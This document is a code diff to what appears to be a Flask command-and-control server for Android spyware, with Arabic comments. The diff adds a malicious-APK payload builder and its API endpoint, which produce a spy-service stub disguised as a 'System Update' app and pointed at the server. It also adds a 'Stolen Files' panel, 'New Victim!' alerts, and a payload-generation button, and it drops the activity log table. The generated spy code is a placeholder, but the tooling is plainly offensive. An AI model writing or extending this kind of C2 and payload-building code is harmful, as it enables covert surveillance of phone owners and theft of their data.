@@ -6,6 +6,7 @@ import time
 import threading
 import logging
 import uuid
+import shutil
 from datetime import datetime, timedelta
 from flask import Flask, request, jsonify, send_file, render_template_string
 from flask_cors import CORS
@@ -115,17 +116,6 @@ class DatabaseManager:
                 file_path TEXT,
                 uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 FOREIGN KEY (device_id) REFERENCES devices (id)
-            )
-        ''')
-
-        # جدول سجلات النشاط
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS activity_logs (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                device_id TEXT,
-                event_type TEXT,
-                details TEXT,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         ''')
 
@@ -264,6 +254,34 @@ def cleanup_service():
 threading.Thread(target=cleanup_service, daemon=True).start()
 
 # ==========================================
+# أدوات بناء APK (Payload Builder)
+# ==========================================
+def generate_malicious_apk(device_id, app_name, package_name, server_url):
+    """محاكاة إنشاء تطبيق أندرويد خبيث"""
+    project_dir = os.path.join(APK_DIR, app_name)
+    if os.path.exists(project_dir):
+        shutil.rmtree(project_dir)
+    os.makedirs(project_dir, exist_ok=True)
+    
+    # محاكاة كود Java للحقن
+    java_code = f"""
+    package {package_name};
+    // Android Spy Service
+    // Server: {server_url}
+    // Target Device: {device_id}
+    
+    public class SpyService extends Service {{
+        private static final String SERVER_URL = "{server_url}";
+        // ... (كود التجسس الكامل هنا)
+    }}
+    """
+    
+    with open(os.path.join(project_dir, "SpyService.java"), "w") as f:
+        f.write(java_code)
+        
+    return java_code  # إرجاع الكود للعرض
+
+# ==========================================
 # واجهة برمجة التطبيقات (API Endpoints)
 # ==========================================
 
@@ -334,6 +352,18 @@ def api_send_command():
     if db.add_command(device_id, cmd_type, payload):
         return jsonify({"status": "queued"})
     return jsonify({"status": "error"}), 500
+
+@app.route('/api/generate_apk', methods=['POST'])
+def api_generate_apk():
+    """إنشاء APK خبيث"""
+    data = request.json
+    code = generate_malicious_apk(
+        data.get('device_id'), 
+        data.get('app_name'), 
+        data.get('package_name'), 
+        request.host_url
+    )
+    return jsonify({"status": "success", "code": code})
 
 # ==========================================
 # واجهة الويب (Control Panel UI)
@@ -466,11 +496,26 @@ def control_panel():
                                 </div>
                                 <div class="mb-3">
                                     <label>LHOST (Server URL)</label>
-                                    <input type="text" class="form-control bg-dark text-light" value="{request.host_url}">
+                                    <input type="text" class="form-control bg-dark text-light" id="serverUrl" value="{request.host_url}">
                                 </div>
-                                <button class="btn btn-danger w-100" onclick="alert('Building payload...')">
+                                <div class="mb-3">
+                                    <label>Device ID (Optional)</label>
+                                    <input type="text" class="form-control bg-dark text-light" id="deviceId" placeholder="Target Device ID">
+                                </div>
+                                <button class="btn btn-danger w-100" onclick="generatePayload()">
                                     <i class="fas fa-radiation"></i> Generate Payload
                                 </button>
+                                <div id="payloadOutput" class="mt-3"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="files" class="tab-content d-none">
+                        <div class="card">
+                            <div class="card-header"><h5>Stolen Files</h5></div>
+                            <div class="card-body text-center text-muted">
+                                <i class="fas fa-folder-open fa-3x mb-3"></i>
+                                <p>Select a device to view files.</p>
                             </div>
                         </div>
                     </div>
@@ -485,7 +530,6 @@ def control_panel():
             const socket = io();
             
             socket.on('device_connected', (data) => {{
-                // Show notification
                 const toast = document.createElement('div');
                 toast.className = 'toast show position-fixed bottom-0 end-0 m-3';
                 toast.innerHTML = `<div class="toast-header"><strong class="me-auto">New Victim!</strong></div><div class="toast-body">${{data.model}} connected.</div>`;
@@ -514,8 +558,26 @@ def control_panel():
             }}
             
             function selectDevice(id) {{
-                // Logic to open detailed device view
                 alert("Opening control panel for: " + id);
+            }}
+
+            function generatePayload() {{
+                const did = document.getElementById('deviceId').value || 'generic';
+                const url = document.getElementById('serverUrl').value;
+                
+                fetch('/api/generate_apk', {{
+                    method: 'POST',
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{
+                        device_id: did,
+                        app_name: 'System Update',
+                        package_name: 'com.android.sys.upd'
+                    }})
+                }})
+                .then(r => r.json())
+                .then(d => {{
+                    document.getElementById('payloadOutput').innerHTML = `<pre class="bg-black p-3 text-success">${{d.code}}</pre>`;
+                }});
             }}
         </script>
     </body>
@@ -532,5 +594,4 @@ def download_file(filename):
 # ==========================================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    # تشغيل SocketIO لدعم الاتصال في الوقت الحقيقي
     socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)
